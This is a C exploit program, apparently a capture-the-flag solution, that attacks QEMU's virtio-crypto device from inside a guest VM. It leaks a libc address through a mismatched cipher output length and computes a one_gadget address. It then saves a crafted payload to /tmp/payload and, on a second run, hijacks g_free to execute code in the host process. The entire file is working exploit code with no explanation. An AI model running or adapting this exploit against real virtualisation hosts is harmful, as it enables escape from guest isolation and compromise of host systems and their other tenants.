#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <assert.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

#include "EasyVirtio_qemu.exp.h"

#define PAGE_SHIFT      12
#define PAGE_SIZE       (1 << PAGE_SHIFT)
#define PFN_PRESENT     (1ull << 63)
#define PFN_PFN         ((1ull << 55) - 1)

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    close(fd);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void hex_dump32(void* buf, size_t len) {
    uint32_t *p = (uint32_t *)buf;
    uint8_t *end = (uint8_t *)buf + len;
    if (len >= 0x10) {
        for (; (uint8_t *)(p+4) <= end; p+=4) {
            printf("0x%08x 0x%08x 0x%08x 0x%08x\n", p[0], p[1], p[2], p[3]);
        }
    }
    if (len % 0x10 >= 8) {
        printf("0x%08x 0x%08x ", p[0], p[1]);
        p += 2;
    }
    if (len % 8 >= 4) {
        printf("0x%08x ", p[0]);
        p += 1;
    }
    if (len % 4 > 0) {
        uint32_t tmp = 0;
        for (size_t i = len % 4; i > 0; i--) {
            tmp |= p[i];
            tmp <<= 8;
        }
        printf("0x%08x\n", tmp);
    }
}

void hex_dump64(void* buf, size_t len) {
    uint64_t *p = (uint64_t *)buf;
    uint8_t *end = (uint8_t *)buf + len;

    puts("=====================================");
    if (len >= 0x10) {
        for (; (uint8_t *)(p+2) <= end; p+=2) {
            printf("0x%016lx 0x%016lx\n", p[0], p[1]);
        }
    }
    if (len % 0x10 >= 8) {
        printf("0x%016lx ", p[0]);
        if (len % 0x10 == 8) {
            putchar('\n');
            return;
        }
        p += 1;
    }
    if (len % 8 > 0) {
        uint64_t tmp = 0;
        for (size_t i = len % 8; i > 0; i--) {
            tmp |= p[i];
            tmp <<= 8;
        }
        printf("0x%016lx\n", tmp);
    }
    puts("=====================================");
}

#define mmio_write64(addr, val) (*(volatile uint64_t *)addr=val)
#define mmio_write32(addr, val) (*(volatile uint32_t *)addr=val)
#define mmio_write16(addr, val) (*(volatile uint16_t *)addr=val)
#define mmio_write8(addr, val)  (*(volatile uint8_t *)addr=val)
#define mmio_read64(addr)       (*(volatile uint64_t *)addr)
#define mmio_read32(addr)       (*(volatile uint32_t *)addr)
#define mmio_read16(addr)       (*(volatile uint16_t *)addr)
#define mmio_read8(addr)        (*(volatile uint8_t *)addr)

void *mmio_init(void *fixed, size_t size, const char *file) {
    void *mem = NULL;

    int mmio_fd = open(file, O_RDWR | O_SYNC);
    if (mmio_fd == -1) {
        perror("[-] failed to open mmio");
        exit(EXIT_FAILURE);
    }

    mem = mmap(fixed, size, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mem == MAP_FAILED) {
        perror("[-] failed to mmap mmio");
        exit(EXIT_FAILURE);
    }
    if (mlock(mem, size) == -1) {
        perror("[-] failed to mlock mmio_mem");
        exit(EXIT_FAILURE);
    }

    close(mmio_fd);
    return mem;
}

#define VIRTIO_CRYPTO_GVA 0xcafe000
#define VIRTIO_CRYPTO_GPA 0xfe000000

volatile uint8_t *virtio_mmio = NULL,
                 *virtio_notify_mmio = NULL;
volatile uint8_t *dma_data = NULL;
volatile uint8_t *ctrlq = NULL;
volatile uint8_t *dataq = NULL;
volatile uint64_t ctrlq_gpa = 0;
volatile uint64_t dataq_gpa = 0;

volatile struct virtio_pci_common_cfg *common_cfg = NULL;
volatile struct virtio_pci_notify_cap *notify_cap = NULL;
volatile struct virtio_crypto_config  *crypto_cfg = NULL;

volatile struct virtq_desc *queue_desc = NULL;
volatile struct virtq_avail *queue_avail = NULL;
volatile struct virtq_used *queue_used = NULL;
uint16_t notify_off = 0;
uint32_t notify_offset = 0;
uint64_t session_id = 0;

#define mb() {__asm__ volatile("mfence":::"memory");}

void print_cap(struct virtio_pci_cap* cap){
    puts("=====================================");
    switch(cap->cfg_type){
        case VIRTIO_PCI_CAP_COMMON_CFG:
            printf("cfg_type: common\n");
            break;
        case VIRTIO_PCI_CAP_NOTIFY_CFG:
            printf("cfg_type: notify\n");
            break;
        case VIRTIO_PCI_CAP_ISR_CFG:
            printf("cfg_type: isr\n");
            break;
        case VIRTIO_PCI_CAP_DEVICE_CFG:
            printf("cfg_type: device\n");
            break;
        case VIRTIO_PCI_CAP_PCI_CFG:
            printf("cfg_type: pci\n");
            break;
        default:
            printf("cfg_type: unknown %d\n", cap->cfg_type);
            break;
    }
    printf("cap_len: %x\tbar: %x\toffset: %x\tlength: %x\n",
            cap->cap_len, cap->bar, cap->offset, cap->length);
}

void print_crypto_cfg() {
    char *fmt = "\
struct virtio_crypto_config {\n \
    le32 status = 0x%x;\n \
    le32 max_dataqueues = 0x%x;\n \
    le32 crypto_services = 0x%x;\n \
    ...\n \
    le32 max_cipher_key_len = 0x%x;\n \
    le32 max_auth_key_len = 0x%x;\n \
    le64 max_size = 0x%lx;\n \
};\n";
    printf(fmt, crypto_cfg->status, crypto_cfg->max_dataqueues, crypto_cfg->crypto_services,
            crypto_cfg->max_cipher_key_len, crypto_cfg->max_auth_key_len, crypto_cfg->max_size);
}

void init_virtio() {
    virtio_mmio = mmio_init((void *)VIRTIO_CRYPTO_GVA, 0x4000, "/sys/devices/pci0000:00/0000:00:04.0/resource4");
    printf("[*] virtio_mmio: %p\n", virtio_mmio);

    struct virtio_pci_cap *cap = NULL;
    uint8_t *config = malloc(0x1000);
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/config", O_RDONLY);
    if(fd < 0){
        perror("[-] failed to open virtio-crypto config");
        exit(EXIT_FAILURE);
    }
    int bytes_read = read(fd, config, 0x1000);
    if(bytes_read <= 0){
        perror("[-] failed to read virtio-crypto config");
        exit(EXIT_FAILURE);
    }
    close(fd);

    uint8_t cap_ptr = config[0x34];
    while(cap_ptr != 0){
        if(config[cap_ptr] != 0x9) { // vndr
            cap_ptr = config[cap_ptr+1]; // next
            continue;
        }
        cap = (struct virtio_pci_cap *)&config[cap_ptr];
        //print_cap(cap);
        switch(cap->cfg_type){
            case VIRTIO_PCI_CAP_COMMON_CFG:
                common_cfg = (struct virtio_pci_common_cfg *)(virtio_mmio + cap->offset);
                printf("[*] common_cfg: %p\n", common_cfg);
                break;
            case VIRTIO_PCI_CAP_NOTIFY_CFG:
                virtio_notify_mmio = virtio_mmio + cap->offset;
                notify_cap = (struct virtio_pci_notify_cap *)virtio_notify_mmio;
                printf("[*] virtio_notify_mmio: %p\n", virtio_notify_mmio);
                break;
            case VIRTIO_PCI_CAP_DEVICE_CFG:
                crypto_cfg = (struct virtio_crypto_config *)(virtio_mmio + cap->offset);
                printf("[*] crypto_cfg: %p\n", crypto_cfg);
                print_crypto_cfg();
            default:
                break;
        }
        cap_ptr = cap->cap_next;
    }
    free(config);
    config = NULL;

    // dma memory for virtqueues
    dataq = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0);
    memset((uint8_t *)dataq, 0, 0x1000);
    mlock((uint8_t *)dataq, 0x1000);
    dataq_gpa =  gva_to_gpa((void *)dataq);
    printf("[*] dataq: %p (%p)\n", dataq, (void *)dataq_gpa);

    ctrlq = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0);
    memset((uint8_t *)ctrlq, 0, 0x1000);
    mlock((uint8_t *)ctrlq, 0x1000);
    ctrlq_gpa =  gva_to_gpa((void *)ctrlq);
    printf("[*] ctrlq: %p (%p)\n", ctrlq, (void *)ctrlq_gpa);

    dma_data = mmap(0, 0x1000,  PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0);
    memset((uint8_t *)dma_data, 0, 0x1000);
    mlock((uint8_t *)dma_data, 0x1000);
    printf("[*] dma_data: %p (%p)\n", dma_data, (void *)gva_to_gpa((void *)dma_data));

}

void reset_device(uint32_t sess_op) {
    /* reset device */
    uint8_t device_status = 0;

    // 1. qvirtio_reset
    mmio_write8(&common_cfg->device_status, device_status);
    // 2. qvirtio_set_acknowledge
    device_status |= VIRTIO_CONFIG_S_ACKNOWLEDGE;
    mmio_write8(&common_cfg->device_status, device_status);
    // 3. qvirtio_set_driver
    device_status |= VIRTIO_CONFIG_S_DRIVER;
    mmio_write8(&common_cfg->device_status, device_status);
    // 4. qvirtio_set_features
    mmio_write32(&common_cfg->driver_feature_select, 0);
    mmio_write32(&common_cfg->driver_feature, 0); // disable all features
    // 5. qvirtio_set_features_ok
    device_status |= VIRTIO_CONFIG_S_FEATURES_OK;
    mmio_write8(&common_cfg->device_status, device_status);

    assert(mmio_read8(&common_cfg->device_status) & VIRTIO_CONFIG_S_FEATURES_OK);

    // 6. init queue
    mmio_write16(&common_cfg->queue_select, 0); // dataq
    mmio_write16(&common_cfg->queue_size, VIRTIO_QUEUE_SIZE);
    mmio_write32(&common_cfg->queue_desc, dataq_gpa);
    mmio_write32(&common_cfg->queue_driver, dataq_gpa + 0x100);
    mmio_write32(&common_cfg->queue_device, dataq_gpa + 0x200);
    mmio_write16(&common_cfg->queue_enable, 1);

    mmio_write16(&common_cfg->queue_select, crypto_cfg->max_dataqueues); // controlq
    mmio_write16(&common_cfg->queue_size, VIRTIO_QUEUE_SIZE);
    mmio_write32(&common_cfg->queue_desc, ctrlq_gpa);
    mmio_write32(&common_cfg->queue_driver, ctrlq_gpa + 0x100);
    mmio_write32(&common_cfg->queue_device, ctrlq_gpa + 0x200);
    mmio_write16(&common_cfg->queue_enable, 1);

    /* Create session */
    memset((uint8_t *)dma_data, 0, 0x1000);
    struct virtio_crypto_op_ctrl_req *ctrl_req = (struct virtio_crypto_op_ctrl_req *)dma_data;
    ctrl_req->header.opcode = VIRTIO_CRYPTO_CIPHER_CREATE_SESSION;
    ctrl_req->op_flf.sym.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;
    ctrl_req->op_flf.sym.op_flf.cipher.algo = VIRTIO_CRYPTO_CIPHER_AES_ECB;
    ctrl_req->op_flf.sym.op_flf.cipher.key_len = AES_KEYSIZE_128;
    ctrl_req->op_flf.sym.op_flf.cipher.op = sess_op;
    memset(&ctrl_req->op_vlf.cipher_key, 0, AES_KEYSIZE_128);

    memset((uint8_t *)ctrlq, 0, 0x1000);
    queue_desc = (struct virtq_desc *)ctrlq;
    queue_avail = (struct virtq_avail *)((uint8_t *)ctrlq + 0x100);
    queue_used = (struct virtq_used *)((uint8_t *)ctrlq + 0x200);

    uint64_t p = gva_to_gpa(ctrl_req);
    size_t idx = 0;

    queue_desc[idx].addr = p;
    queue_desc[idx].len = sizeof(struct virtio_crypto_ctrl_header);
    queue_desc[idx].flags = VIRTQ_DESC_F_NEXT;
    queue_desc[idx].next = idx+1;
    p += sizeof(struct virtio_crypto_ctrl_header);
    idx++;

    queue_desc[idx].addr = p;
    queue_desc[idx].len = VIRTIO_CRYPTO_CTRLQ_OP_SPEC_HDR_LEGACY;
    queue_desc[idx].flags = VIRTQ_DESC_F_NEXT;
    queue_desc[idx].next = idx+1;
    p += VIRTIO_CRYPTO_CTRLQ_OP_SPEC_HDR_LEGACY;
    idx++;

    queue_desc[idx].addr = p;
    queue_desc[idx].len = AES_KEYSIZE_128;
    queue_desc[idx].flags = VIRTQ_DESC_F_NEXT;
    queue_desc[idx].next = idx+1;
    p += AES_KEYSIZE_128;
    idx++;

    queue_desc[idx].addr = p;
    queue_desc[idx].len = sizeof(struct virtio_crypto_create_session_input);
    queue_desc[idx].flags = VIRTQ_DESC_F_WRITE;
    queue_desc[idx].next = 0;
    p += sizeof(struct virtio_crypto_create_session_input);
    idx++;

    queue_avail->ring[0] = 0;
    queue_avail->idx = 1;
    queue_avail->flags = VIRTQ_AVAIL_F_NO_INTERRUPT;
    mb();

    // 7. qvirtio_set_driver_ok
    device_status |= VIRTIO_CONFIG_S_DRIVER_OK;
    mmio_write8(&common_cfg->device_status, device_status);

    assert(ctrl_req->op_outcome.create.status == VIRTIO_CRYPTO_OK);
    session_id = ctrl_req->op_outcome.create.session_id;
    printf("[+] Create session: id %lx\n",
            ctrl_req->op_outcome.create.session_id); // no use???
}

uint8_t* cipher_op(uint32_t sess_id, uint16_t avail_idx, uint32_t opcode, uint8_t *iv, uint32_t iv_len,
        uint8_t *src, uint32_t src_len, uint32_t dst_len) {
    memset((uint8_t *)dma_data, 0, 0x1000);

    struct virtio_crypto_op_data_req *data_req = (struct virtio_crypto_op_data_req *)(dma_data+0x100);
    data_req->header.opcode = opcode;
    data_req->header.session_id = sess_id;
    data_req->op_flf.sym.op_type = VIRTIO_CRYPTO_SYM_OP_CIPHER;
    data_req->op_flf.sym.op_type_flf.cipher.iv_len = iv_len;
    data_req->op_flf.sym.op_type_flf.cipher.src_data_len = src_len;
    data_req->op_flf.sym.op_type_flf.cipher.dst_data_len = dst_len;

    queue_desc = (struct virtq_desc *)dataq;
    queue_avail = (struct virtq_avail *)((uint8_t *)dataq + 0x100);
    queue_used = (struct virtq_used *)((uint8_t *)dataq + 0x200);

    uint64_t p = gva_to_gpa(data_req);
    size_t idx = 0;
    queue_desc[idx].addr = p;
    queue_desc[idx].len = sizeof(struct virtio_crypto_op_header);
    queue_desc[idx].flags = VIRTQ_DESC_F_NEXT;
    queue_desc[idx].next = idx+1;
    p += sizeof(struct virtio_crypto_op_header);
    idx++;

    queue_desc[idx].addr = p;
    queue_desc[idx].len = VIRTIO_CRYPTO_DATAQ_OP_SPEC_HDR_LEGACY;
    queue_desc[idx].flags = VIRTQ_DESC_F_NEXT;
    queue_desc[idx].next = idx+1;
    p += VIRTIO_CRYPTO_DATAQ_OP_SPEC_HDR_LEGACY;
    idx++;

    if (iv_len > 0) {
        memcpy(&(data_req->sym_data_vlf), iv, iv_len);
        queue_desc[idx].addr = p;
        queue_desc[idx].len = iv_len; // iv
        queue_desc[idx].flags = VIRTQ_DESC_F_NEXT;
        queue_desc[idx].next = idx+1;
        p += iv_len;
        idx++;
    }

    if (src_len > 0) {
        memcpy((uint8_t *)&(data_req->sym_data_vlf) + iv_len, src, src_len);
        queue_desc[idx].addr = p;
        queue_desc[idx].len = src_len; // src_data
        queue_desc[idx].flags = VIRTQ_DESC_F_NEXT;
        queue_desc[idx].next = idx+1;
        p += src_len;
        idx++;
    }

    queue_desc[idx].addr = p;
    queue_desc[idx].len = src_len; // dst_data
    queue_desc[idx].flags = VIRTQ_DESC_F_NEXT|VIRTQ_DESC_F_WRITE;
    queue_desc[idx].next = idx+1;
    p += src_len;
    idx++;

    queue_desc[idx].addr = p;
    queue_desc[idx].len = sizeof(struct virtio_crypto_inhdr);
    queue_desc[idx].flags = VIRTQ_DESC_F_WRITE;
    queue_desc[idx].next = 0;

    queue_avail->ring[avail_idx] = 0;
    queue_avail->idx = avail_idx+1;
    queue_avail->flags = VIRTQ_AVAIL_F_NO_INTERRUPT;
    mb();

    assert(mmio_read8(&crypto_cfg->status) & VIRTIO_CRYPTO_S_HW_READY);
    notify_off = mmio_read16(&common_cfg->queue_notify_off);
    notify_offset = notify_cap->cap.offset + notify_off*notify_cap->notify_off_multiplier;

    mmio_write16((uint16_t *)(virtio_notify_mmio + notify_offset), 0);
    return (uint8_t *)&(data_req->sym_data_vlf) + iv_len + src_len;
}

void leak() {
    uint8_t *src = (uint8_t *)calloc(0x100, sizeof(uint8_t));
    uint8_t *dst = NULL;

    reset_device(VIRTIO_CRYPTO_OP_ENCRYPT);

    dst = cipher_op(0xaa, 0, VIRTIO_CRYPTO_CIPHER_ENCRYPT, NULL, 0, src, 0x20, 0x10);
    hex_dump64(dst, 0x20);

    uint64_t libc_base = *(uint64_t *)(dst+0x10) - 0x562d50;
    uint64_t ogg = libc_base + 0xebce2;
    printf("[+] libc_base: %p\n", (void *)libc_base);

    memset(src, 0, 0x100);
    memcpy(src, dst, 0x20);
    *(uint64_t *)(src+0x10) = ogg;
    hex_dump64(src, 0x20);

    dst = cipher_op(0, 1, VIRTIO_CRYPTO_CIPHER_ENCRYPT, NULL, 0, src, 0x20, 0x20);
    hex_dump64(dst, 0x20);

    int fd = -1;
    fd = open("/tmp/payload", O_RDWR|O_CREAT|O_TRUNC, S_IRUSR|S_IWUSR);
    write(fd, dst, 0x20);
    close(fd);
}

void exploit() {
    uint8_t *src = (uint8_t *)calloc(0x100, sizeof(uint8_t));

    reset_device(VIRTIO_CRYPTO_OP_DECRYPT);

    // hijack g_free
    int fd = -1;
    fd = open("/tmp/payload", O_RDWR);
    read(fd, src, 0x20);
    close(fd);

    cipher_op(1, 0, VIRTIO_CRYPTO_CIPHER_DECRYPT, NULL, 0, src, 0x20, 0x10);
}

int main(int argc, char* argv[]) {
    init_virtio();

    if (argc < 2) {
        printf("Usage: %s [leak|exploit]\n", argv[0]);
    } else if (!strcmp(argv[1], "leak")) {
        leak();
    } else if (!strcmp(argv[1], "exploit")) {
        exploit();
    } else {
        printf("Usage: %s [leak|exploit]\n", argv[0]);
    }

    munmap((void *)dataq, 0x1000);
    munmap((void *)ctrlq, 0x1000);
    munmap((void *)dma_data, 0x1000);
    munmap((void *)virtio_mmio, 0x4000);
    return 0;
}

